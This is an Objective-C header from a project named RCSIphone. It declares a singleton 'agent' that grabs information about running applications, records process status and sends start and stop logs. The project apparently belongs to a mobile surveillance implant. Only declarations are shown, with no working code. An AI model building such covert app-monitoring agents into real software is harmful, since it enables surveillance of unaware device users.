//
//  RCSMAgentApplication.h
//  RCSIphone
//
//  Created by kiodo on 12/3/10.
//  Copyright 2010 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "RCSMInterface.h"

//typedef __appStruct {
//  struct tm timestamp;
//  char *name;
//  char *status;
//  char *desc;
//  char *delim;
//} appStruct;

@interface __m_MAgentApplication : NSObject 
{
  BOOL      isAppStarted;
  NSString *mProcessName;
  NSString *mProcessDesc;
@private
  NSMutableDictionary *mAgentConfiguration;
}

@property (readwrite) BOOL isAppStarted;

+ (__m_MAgentApplication *)sharedInstance;

+ (id)allocWithZone: (NSZone *)aZone;

- (unsigned)retainCount;
- (id)retain;

- (id)copyWithZone: (NSZone *)aZone;

- (id)autorelease;
- (void)release;

- (BOOL)grabInfo: (NSString*)aStatus;
- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus;

- (void)start;
- (BOOL)stop;

- (void)sendStopLog;
- (void)sendStartLog;

@end
